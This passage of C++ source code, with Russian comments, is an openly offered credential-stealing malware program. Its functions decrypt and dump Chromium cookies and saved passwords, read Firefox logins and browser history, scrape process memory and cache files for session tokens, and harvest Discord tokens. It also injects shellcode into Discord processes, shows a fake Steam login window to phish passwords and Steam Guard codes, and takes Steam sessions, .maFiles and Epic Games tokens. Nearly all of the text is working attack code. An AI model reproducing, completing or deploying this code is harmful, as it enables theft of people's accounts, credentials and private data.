        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to save screenshot");
    } else {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Screenshot saved: " + screenshotName);
    }
    return screenshotName;
}

// Дешифрование данных Chromium
std::string DecryptChromiumData(DATA_BLOB& encryptedData) {
    DATA_BLOB decryptedData;
    if (CryptUnprotectData(&encryptedData, nullptr, nullptr, nullptr, nullptr, 0, &decryptedData)) {
        std::string result((char*)decryptedData.pbData, decryptedData.cbData);
        LocalFree(decryptedData.pbData);
        return result;
    }
    std::lock_guard<std::mutex> lock(g_mutex);
    if (g_mainWindow) g_mainWindow->appendLog("Failed to decrypt Chromium data");
    return "";
}

// Захват WebSocket сессий
std::string CaptureWebSocketSessions(const std::string& processName) {
    std::string result;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to create process snapshot for WebSocket capture");
        return result;
    }
    PROCESSENTRY32W pe32 = { sizeof(pe32) };
    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, std::wstring(processName.begin(), processName.end()).c_str()) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    char buffer[4096];
                    SIZE_T bytesRead;
                    MEMORY_BASIC_INFORMATION mbi;
                    LPVOID address = 0;
                    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
                        if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
                            if (ReadProcessMemory(hProcess, address, buffer, sizeof(buffer), &bytesRead)) {
                                std::string memoryData(buffer, bytesRead);
                                std::regex wsRegex("wss?://[^\\s]+");
                                std::smatch match;
                                std::string::const_iterator searchStart(memoryData.cbegin());
                                while (std::regex_search(searchStart, memoryData.cend(), match, wsRegex)) {
                                    result += "WebSocket URL: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                                std::regex steamGuardRegex("Steam Guard Code: [A-Z0-9]{5}");
                                searchStart = memoryData.cbegin();
                                while (std::regex_search(searchStart, memoryData.cend(), match, steamGuardRegex)) {
                                    result += "Steam Guard Code: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                                std::regex tokenRegex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");
                                searchStart = memoryData.cbegin();
                                while (std::regex_search(searchStart, memoryData.cend(), match, tokenRegex)) {
                                    result += "WebSocket Token: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                            }
                        }
                        address = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);
    return result;
}

// Захват WebRTC сессий
std::string CaptureWebRTCSessions(const std::string& processName) {
    std::string result;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to create process snapshot for WebRTC capture");
        return result;
    }
    PROCESSENTRY32W pe32 = { sizeof(pe32) };
    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, std::wstring(processName.begin(), processName.end()).c_str()) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    char buffer[4096];
                    SIZE_T bytesRead;
                    MEMORY_BASIC_INFORMATION mbi;
                    LPVOID address = 0;
                    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
                        if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
                            if (ReadProcessMemory(hProcess, address, buffer, sizeof(buffer), &bytesRead)) {
                                std::string memoryData(buffer, bytesRead);
                                std::regex webrtcRegex("ice-ufrag:[a-zA-Z0-9+/=]+");
                                std::smatch match;
                                std::string::const_iterator searchStart(memoryData.cbegin());
                                while (std::regex_search(searchStart, memoryData.cend(), match, webrtcRegex)) {
                                    result += "WebRTC ICE Candidate: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                                std::regex ipRegex("\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b");
                                searchStart = memoryData.cbegin();
                                while (std::regex_search(searchStart, memoryData.cend(), match, ipRegex)) {
                                    result += "WebRTC IP: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                            }
                        }
                        address = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);
    return result;
}

// Кража несохраненных данных браузера
std::string StealUnsavedBrowserData(const std::string& browserName, const std::string& cachePath) {
    std::string result;
    try {
        if (std::filesystem::exists(cachePath)) {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(cachePath)) {
                if (entry.path().extension() == ".tmp" || entry.path().filename().string().find("Cache") != std::string::npos) {
                    std::ifstream file(entry.path(), std::ios::binary);
                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    file.close();
                    std::regex emailRegex("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}");
                    std::smatch match;
                    std::string::const_iterator searchStart(content.cbegin());
                    while (std::regex_search(searchStart, content.cend(), match, emailRegex)) {
                        result += "[" + browserName + "] Unsaved Email: " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }
                    std::regex passRegex("pass(?:word)?=[^&\\s]+");
                    searchStart = content.cbegin();
                    while (std::regex_search(searchStart, content.cend(), match, passRegex)) {
                        result += "[" + browserName + "] Unsaved Password: " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }
                    std::regex autofillRegex("\"autofill\":\"[^\"]+\"");
                    searchStart = content.cbegin();
                    while (std::regex_search(searchStart, content.cend(), match, autofillRegex)) {
                        result += "[" + browserName + "] Autofill Data: " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }
                    std::regex sessionRegex("sessionid=[a-zA-Z0-9]+");
                    searchStart = content.cbegin();
                    while (std::regex_search(searchStart, content.cend(), match, sessionRegex)) {
                        result += "[" + browserName + "] Unsaved Session: " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }
                }
            }
        }
    } catch (const std::exception& e) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Error in StealUnsavedBrowserData for " + browserName + ": " + e.what());
    }
    return result;
}

// Кража кэшированных данных приложений
std::string StealAppCacheData(const std::string& appName, const std::string& cachePath) {
    std::string result;
    try {
        if (std::filesystem::exists(cachePath)) {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(cachePath)) {
                if (entry.path().filename().string().find("cache") != std::string::npos || entry.path().extension() == ".tmp") {
                    std::ifstream file(entry.path(), std::ios::binary);
                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    file.close();
                    std::regex tokenRegex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");
                    std::smatch match;
                    std::string::const_iterator searchStart(content.cbegin());
                    while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
                        result += "[" + appName + "] Cached Token: " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }
                    std::regex emailRegex("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}");
                    searchStart = content.cbegin();
                    while (std::regex_search(searchStart, content.cend(), match, emailRegex)) {
                        result += "[" + appName + "] Cached Email: " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }
                    std::regex sessionRegex("sessionid=[a-zA-Z0-9]+");
                    searchStart = content.cbegin();
                    while (std::regex_search(searchStart, content.cend(), match, sessionRegex)) {
                        result += "[" + appName + "] Cached Session: " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }
                }
            }
        }
    } catch (const std::exception& e) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Error in StealAppCacheData for " + appName + ": " + e.what());
    }
    return result;
}

// Кража данных Chromium
std::string StealChromiumData(const std::string& browserName, const std::string& dbPath) {
    std::string result;
    if (!g_mainWindow->cookiesCheckBox->isChecked() && !g_mainWindow->passwordsCheckBox->isChecked()) return result;
    std::string cookiesDbPath = dbPath + "Cookies";
    std::string loginDbPath = dbPath + "Login Data";
    sqlite3* db = nullptr;
    if (g_mainWindow->cookiesCheckBox->isChecked() && std::filesystem::exists(cookiesDbPath)) {
        if (sqlite3_open(cookiesDbPath.c_str(), &db) == SQLITE_OK) {
            sqlite3_stmt* stmt;
            const char* query = "SELECT host_key, name, encrypted_value FROM cookies";
            if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    std::string host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                    std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                    DATA_BLOB encryptedData = { sqlite3_column_bytes(stmt, 2), (BYTE*)sqlite3_column_blob(stmt, 2) };
                    std::string value = DecryptChromiumData(encryptedData);
                    if (!value.empty()) {
                        if (host.find("mail.google.com") != std::string::npos || host.find("outlook.com") != std::string::npos ||
                            host.find("yahoo.com") != std::string::npos || host.find("mail.ru") != std::string::npos ||
                            host.find("aol.com") != std::string::npos || host.find("protonmail.com") != std::string::npos ||
                            host.find("icloud.com") != std::string::npos || host.find("steampowered.com") != std::string::npos ||
                            host.find("roblox.com") != std::string::npos) {
                            result += "[" + browserName + "] Critical Cookie (" + host + ") | " + name + " | " + value + "\n";
                        } else {
                            result += "[" + browserName + "] Cookie | " + host + " | " + name + " | " + value + "\n";
                        }
                    }
                }
                sqlite3_finalize(stmt);
            }
            sqlite3_close(db);
        }
    }
    db = nullptr;
    if (g_mainWindow->passwordsCheckBox->isChecked() && std::filesystem::exists(loginDbPath)) {
        if (sqlite3_open(loginDbPath.c_str(), &db) == SQLITE_OK) {
            sqlite3_stmt* stmt;
            const char* query = "SELECT origin_url, username_value, password_value FROM logins";
            if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    std::string url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                    std::string username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                    DATA_BLOB encryptedData = { sqlite3_column_bytes(stmt, 2), (BYTE*)sqlite3_column_blob(stmt, 2) };
                    std::string password = DecryptChromiumData(encryptedData);
                    if (!password.empty()) {
                        if (url.find("mail.google.com") != std::string::npos || url.find("outlook.com") != std::string::npos ||
                            url.find("yahoo.com") != std::string::npos || url.find("mail.ru") != std::string::npos ||
                            url.find("aol.com") != std::string::npos || url.find("protonmail.com") != std::string::npos ||
                            url.find("icloud.com") != std::string::npos || url.find("steampowered.com") != std::string::npos ||
                            url.find("roblox.com") != std::string::npos) {
                            result += "[" + browserName + "] Critical Password (" + url + ") | " + username + " | " + password + "\n";
                        } else {
                            result += "[" + browserName + "] Password | " + url + " | " + username + " | " + password + "\n";
                        }
                    }
                }
                sqlite3_finalize(stmt);
            }
            sqlite3_close(db);
        }
    }
    return result;
}

// Кража данных Firefox
std::string StealFirefoxData(const std::string& profilePath) {
    std::string result;
    if (!g_mainWindow->cookiesCheckBox->isChecked() && !g_mainWindow->passwordsCheckBox->isChecked()) return result;
    std::string cookiesDbPath = profilePath + "/cookies.sqlite";
    sqlite3* db = nullptr;
    if (g_mainWindow->cookiesCheckBox->isChecked() && std::filesystem::exists(cookiesDbPath)) {
        if (sqlite3_open(cookiesDbPath.c_str(), &db) == SQLITE_OK) {
            sqlite3_stmt* stmt;
            const char* query = "SELECT host, name, value FROM moz_cookies";
            if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    std::string host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                    std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                    std::string value = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));
                    if (!value.empty()) {
                        result += "[Firefox] Cookie | " + host + " | " + name + " | " + value + "\n";
                    }
                }
                sqlite3_finalize(stmt);
            }
            sqlite3_close(db);
        }
    }
    db = nullptr;
    std::string loginDbPath = profilePath + "/logins.json";
    if (g_mainWindow->passwordsCheckBox->isChecked() && std::filesystem::exists(loginDbPath)) {
        std::ifstream file(loginDbPath);
        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();
        std::regex loginRegex("\"hostname\":\"([^\"]+)\",\"encryptedUsername\":\"([^\"]+)\",\"encryptedPassword\":\"([^\"]+)\"");
        std::smatch match;
        std::string::const_iterator searchStart(content.cbegin());
        while (std::regex_search(searchStart, content.cend(), match, loginRegex)) {
            std::string host = match[1].str();
            std::string encryptedUsername = match[2].str();
            std::string encryptedPassword = match[3].str();
            std::string username = encryptedUsername;
            std::string password = encryptedPassword;
            for (size_t i = 0; i < username.size(); i++) {
                username[i] ^= ENCRYPTION_KEY1[i % ENCRYPTION_KEY1.size()];
            }
            for (size_t i = 0; i < password.size(); i++) {
                password[i] ^= ENCRYPTION_KEY1[i % ENCRYPTION_KEY1.size()];
            }
            result += "[Firefox] Password | " + host + " | " + username + " | " + password + "\n";
            searchStart = match.suffix().first;
        }
    }
    return result;
}

// Получение истории браузера
std::string GetBrowserHistory() {
    std::string result;
    std::vector<std::pair<std::string, std::string>> browsers = {
        {"Chrome", std::string(std::getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default\\History"},
        {"Edge", std::string(std::getenv("LOCALAPPDATA")) + "\\Microsoft\\Edge\\User Data\\Default\\History"},
        {"Opera", std::string(std::getenv("APPDATA")) + "\\Opera Software\\Opera Stable\\History"},
        {"OperaGX", std::string(std::getenv("APPDATA")) + "\\Opera Software\\Opera GX Stable\\History"},
        {"Vivaldi", std::string(std::getenv("LOCALAPPDATA")) + "\\Vivaldi\\User Data\\Default\\History"},
        {"Yandex", std::string(std::getenv("LOCALAPPDATA")) + "\\Yandex\\YandexBrowser\\User Data\\Default\\History"}
    };
    for (const auto& browser : browsers) {
        if (std::filesystem::exists(browser.second)) {
            sqlite3* db = nullptr;
            if (sqlite3_open(browser.second.c_str(), &db) == SQLITE_OK) {
                sqlite3_stmt* stmt;
                const char* query = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 100";
                if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        std::string url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                        std::string title = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                        int visitCount = sqlite3_column_int(stmt, 2);
                        result += "[" + browser.first + "] URL: " + url + " | Title: " + title + " | Visits: " + std::to_string(visitCount) + "\n";
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }
        }
    }
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appDataPath);
    std::string firefoxPath = std::string(appDataPath) + "\\Mozilla\\Firefox\\Profiles\\";
    if (std::filesystem::exists(firefoxPath)) {
        for (const auto& entry : std::filesystem::directory_iterator(firefoxPath)) {
            std::string historyDbPath = entry.path().string() + "\\places.sqlite";
            sqlite3* db = nullptr;
            if (sqlite3_open(historyDbPath.c_str(), &db) == SQLITE_OK) {
                sqlite3_stmt* stmt;
                const char* query = "SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 100";
                if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        std::string url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                        std::string title = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                        int visitCount = sqlite3_column_int(stmt, 2);
                        result += "[Firefox] URL: " + url + " | Title: " + title + " | Visits: " + std::to_string(visitCount) + "\n";
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }
        }
    }
    return result;
}

// Кража токенов Discord
std::vector<std::string> StealDiscordTokens() {
    if (!g_mainWindow->discordCheckBox->isChecked()) return {};
    std::vector<std::string> tokens;
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appDataPath);
    std::string discordPath = std::string(appDataPath) + "\\discord\\Local Storage\\leveldb\\";
    std::string discordPTBPath = std::string(appDataPath) + "\\discordptb\\Local Storage\\leveldb\\";
    std::string discordCanaryPath = std::string(appDataPath) + "\\discordcanary\\Local Storage\\leveldb\\";
    std::vector<std::string> paths = {discordPath, discordPTBPath, discordCanaryPath};
    for (const auto& path : paths) {
        if (std::filesystem::exists(path)) {
            for (const auto& entry : std::filesystem::directory_iterator(path)) {
                if (entry.path().extension() == ".ldb" || entry.path().extension() == ".log") {
                    std::ifstream file(entry.path(), std::ios::binary);
                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    file.close();
                    std::regex tokenRegex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");
                    std::smatch match;
                    std::string::const_iterator searchStart(content.cbegin());
                    while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
                        std::string token = match[0].str();
                        if (std::find(tokens.begin(), tokens.end(), token) == tokens.end()) {
                            tokens.push_back("Discord Token: " + token);
                        }
                        searchStart = match.suffix().first;
                    }
                }
            }
        }
    }
    return tokens;
}

// Инъекция в процесс
std::string InjectIntoProcess(const std::wstring& processName) {
    std::string result;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) return result;
    PROCESSENTRY32W pe32 = { sizeof(pe32) };
    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    unsigned char shellcode[] = {
                        0x6A, 0x00,              // push 0 (MB_OK)
                        0x68, 0x00, 0x00, 0x00, 0x00, // push "Process Hooked" (адрес строки будет заменен)
                        0x68, 0x00, 0x00, 0x00, 0x00, // push "Info" (адрес строки будет заменен)
                        0x6A, 0x00,              // push 0 (hwnd)
                        0xFF, 0x15, 0x00, 0x00, 0x00, 0x00, // call MessageBoxA (адрес будет заменен)
                        0xC3                     // ret
                    };
                    const char* title = "Info";
                    const char* message = "Process Hooked";
                    LPVOID remoteTitle = VirtualAllocEx(hProcess, nullptr, strlen(title) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                    LPVOID remoteMessage = VirtualAllocEx(hProcess, nullptr, strlen(message) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                    WriteProcessMemory(hProcess, remoteTitle, title, strlen(title) + 1, nullptr);
                    WriteProcessMemory(hProcess, remoteMessage, message, strlen(message) + 1, nullptr);
                    HMODULE hUser32 = GetModuleHandleA("user32.dll");
                    FARPROC messageBoxAddr = GetProcAddress(hUser32, "MessageBoxA");
                    memcpy(shellcode + 3, &remoteTitle, 4);
                    memcpy(shellcode + 8, &remoteMessage, 4);
                    memcpy(shellcode + 15, &messageBoxAddr, 4);
                    LPVOID remoteMemory = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    if (remoteMemory) {
                        WriteProcessMemory(hProcess, remoteMemory, shellcode, sizeof(shellcode), nullptr);
                        HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteMemory, nullptr, 0, nullptr);
                        if (hThread) {
                            WaitForSingleObject(hThread, INFINITE);
                            char buffer[4096];
                            SIZE_T bytesRead;
                            if (ReadProcessMemory(hProcess, remoteMemory, buffer, sizeof(buffer), &bytesRead)) {
                                std::string memoryData(buffer, bytesRead);
                                std::regex tokenRegex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");
                                std::smatch match;
                                std::string::const_iterator searchStart(memoryData.cbegin());
                                while (std::regex_search(searchStart, memoryData.cend(), match, tokenRegex)) {
                                    result += "Injected Token: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                                std::regex sessionRegex("sessionid=[a-zA-Z0-9]+");
                                searchStart = memoryData.cbegin();
                                while (std::regex_search(searchStart, memoryData.cend(), match, sessionRegex)) {
                                    result += "Injected Session: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                            }
                            CloseHandle(hThread);
                        }
                        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
                    }
                    VirtualFreeEx(hProcess, remoteTitle, 0, MEM_RELEASE);
                    VirtualFreeEx(hProcess, remoteMessage, 0, MEM_RELEASE);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);
    return result;
}

// Инъекция в Discord
std::string InjectIntoDiscord() {
    if (!g_mainWindow->discordCheckBox->isChecked()) return "";
    std::string result;
    std::vector<std::wstring> discordProcesses = {L"Discord.exe", L"DiscordPTB.exe", L"DiscordCanary.exe"};
    for (const auto& process : discordProcesses) {
        std::string injectionResult = InjectIntoProcess(process);
        if (!injectionResult.empty()) result += injectionResult;
    }
    return result;
}

// Обработчик сообщений для фейкового окна
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HWND hwndUsername, hwndPassword, hwndSteamGuard, hwndButton;
    static std::string* resultPtr;

    switch (msg) {
    case WM_CREATE: {
        hwndUsername = CreateWindowExA(0, "EDIT", "", WS_CHILD | WS_VISIBLE | WS_BORDER, 50, 50, 200, 20, hwnd, nullptr, GetModuleHandle(nullptr), nullptr);
        hwndPassword = CreateWindowExA(0, "EDIT", "", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_PASSWORD, 50, 80, 200, 20, hwnd, nullptr, GetModuleHandle(nullptr), nullptr);
        hwndSteamGuard = CreateWindowExA(0, "EDIT", "", WS_CHILD | WS_VISIBLE | WS_BORDER, 50, 110, 200, 20, hwnd, nullptr, GetModuleHandle(nullptr), nullptr);
        hwndButton = CreateWindowExA(0, "BUTTON", "Login", WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON, 100, 140, 100, 30, hwnd, nullptr, GetModuleHandle(nullptr), nullptr);
        resultPtr = (std::string*)((CREATESTRUCT*)lParam)->lpCreateParams;
        break;
    }
    case WM_COMMAND:
        if ((HWND)lParam == hwndButton) {
            char username[256], password[256], steamGuard[256];
            GetWindowTextA(hwndUsername, username, sizeof(username));
            GetWindowTextA(hwndPassword, password, sizeof(password));
            GetWindowTextA(hwndSteamGuard, steamGuard, sizeof(steamGuard));
            *resultPtr = "Fake Steam Login | Username: " + std::string(username) + " | Password: " + std::string(password) + " | Steam Guard: " + std::string(steamGuard) + "\n";
            PostQuitMessage(0);
        }
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

// Создание фейкового окна логина Steam
std::string CreateFakeSteamLoginWindow() {
    if (!g_mainWindow->socialEngineeringCheckBox->isChecked()) return "";
    std::string result;
    WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_HREDRAW | CS_VREDRAW, WndProc, 0, 0, GetModuleHandle(nullptr), nullptr, nullptr, nullptr, nullptr, "FakeSteamLoginWindow" };
    RegisterClassEx(&wc);
    HWND hwnd = CreateWindowExA(0, "FakeSteamLoginWindow", "Steam Login", WS_OVERLAPPEDWINDOW | WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, 300, 200, nullptr, nullptr, GetModuleHandle(nullptr), &result);
    if (!hwnd) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to create fake Steam login window");
        return "";
    }
    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnregisterClass("FakeSteamLoginWindow", GetModuleHandle(nullptr));
    return result;
}

// Кража сессии Steam из реестра
std::string StealSteamSessionFromRegistry() {
    if (!g_mainWindow->steamCheckBox->isChecked()) return "";
    std::string result;
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Valve\\Steam", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char value[1024];
        DWORD size = sizeof(value);
        if (RegQueryValueExA(hKey, "AutoLoginUser", nullptr, nullptr, (LPBYTE)value, &size) == ERROR_SUCCESS) {
            result += "Steam AutoLoginUser: " + std::string(value) + "\n";
        }
        size = sizeof(value);
        if (RegQueryValueExA(hKey, "RememberPassword", nullptr, nullptr, (LPBYTE)value, &size) == ERROR_SUCCESS) {
            result += "Steam RememberPassword: " + std::string(value) + "\n";
        }
        RegCloseKey(hKey);
    }
    return result;
}

// Кража веб-сессии Steam
std::string StealSteamWebSession() {
    if (!g_mainWindow->steamCheckBox->isChecked()) return "";
    std::string result;
    char appDataPath[MAX_PATH];
    if (SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, appDataPath) != S_OK) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to get LOCAL_APPDATA for Steam web session");
        return result;
    }
    std::string webSessionPath = std::string(appDataPath) + "\\Steam\\htmlcache\\Cache\\";
    if (std::filesystem::exists(webSessionPath)) {
        try {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(webSessionPath)) {
                if (entry.path().extension() == ".tmp" || entry.path().filename().string().find("cache") != std::string::npos) {
                    std::ifstream file(entry.path(), std::ios::binary);
                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    file.close();
                    std::regex sessionRegex("sessionid=[a-zA-Z0-9]+");
                    std::smatch match;
                    std::string::const_iterator searchStart(content.cbegin());
                    while (std::regex_search(searchStart, content.cend(), match, sessionRegex)) {
                        result += "Steam Web Session: " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }
                    std::regex steamGuardRegex("Steam Guard Code: [A-Z0-9]{5}");
                    searchStart = content.cbegin();
                    while (std::regex_search(searchStart, content.cend(), match, steamGuardRegex)) {
                        result += "Steam Guard Code: " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }
                    std::regex tokenRegex("steamLoginSecure=[^;]+");
                    searchStart = content.cbegin();
                    while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
                        result += "Steam Login Token: " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }
                }
            }
        } catch (const std::exception& e) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Error in StealSteamWebSession: " + std::string(e.what()));
        }
    }
    return result;
}

// Кража файлов Steam MA
std::vector<std::string> StealSteamMAFiles() {
    if (!g_mainWindow->steamMAFileCheckBox->isChecked()) return {};
    std::vector<std::string> files;
    char docPath[MAX_PATH];
    if (SHGetFolderPathA(nullptr, CSIDL_MYDOCUMENTS, nullptr, 0, docPath) == S_OK) {
        std::string documentsPath = std::string(docPath);
        try {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(documentsPath)) {
                if (entry.path().extension() == ".maFile") {
                    files.push_back(entry.path().string());
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->appendLog("Found Steam MAFile: " + entry.path().string());
                }
            }
        } catch (const std::exception& e) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Error in StealSteamMAFiles: " + std::string(e.what()));
        }
    }
    return files;
}

// Кража данных Epic Games
std::string StealEpicGamesData() {
    if (!g_mainWindow->epicCheckBox->isChecked()) return "";
    std::string result;
    char appDataPath[MAX_PATH];
    if (SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, appDataPath) != S_OK) return result;
    std::string epicPath = std::string(appDataPath) + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\";
    if (std::filesystem::exists(epicPath)) {
        try {
            for (const auto& entry : std::filesystem::directory_iterator(epicPath)) {
                if (entry.path().filename() == "GameUserSettings.ini") {
                    std::ifstream file(entry.path());
                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    file.close();
                    std::regex tokenRegex("Token=[^\\n]+");
                    std::smatch match;
                    if (std::regex_search(content, match, tokenRegex)) {
                        result += "Epic Games Token: " + match[0].str() + "\n";
                    }
                }
            }
